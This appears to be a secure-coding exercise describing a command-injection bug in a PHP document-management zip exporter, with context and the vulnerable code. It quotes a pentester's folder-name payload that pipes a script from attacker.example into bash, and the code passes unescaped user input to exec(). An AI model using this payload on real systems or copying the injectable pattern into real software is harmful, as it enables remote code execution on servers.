## Context

This file is `export/ZipExporter.php` in a document-management SaaS. Users can request a zip archive of a folder they own; the folder name they entered at creation time is used as the zip filename. The file is generated by shelling out to the system `zip` binary because the PHP `ZipArchive` extension was not available on the original server.

A customer reported that their export button started returning a 500 error after they renamed their folder to include some special characters. The ops team saw in the server error log: `sh: 1: Syntax error: Unterminated quoted string`. They added extra quoting around the filename and the 500 went away — but the underlying injection surface was not eliminated, just made slightly harder to trigger accidentally.

A penetration tester later demonstrated that a folder named `pwned; curl http://attacker.example/shell.sh | bash #` produced outbound HTTP traffic from the server during an export request.

## Buggy code

```php
<?php
// export/ZipExporter.php

class ZipExporter
{
    private string $storageRoot;

    public function __construct(string $storageRoot)
    {
        $this->storageRoot = rtrim($storageRoot, '/');
    }

    public function export(string $folderName, string $userId): string
    {
        $sourceDir = $this->storageRoot . '/' . $userId . '/' . $folderName;
        $outputZip = sys_get_temp_dir() . '/' . $folderName . '.zip';

        if (!is_dir($sourceDir)) {
            throw new RuntimeException('Folder not found');
        }

        $cmd = "zip -r \"$outputZip\" \"$sourceDir\"";
        exec($cmd, $output, $returnCode);

        if ($returnCode !== 0) {
            throw new RuntimeException('zip failed: ' . implode('\n', $output));
        }

        return $outputZip;
    }
}
```
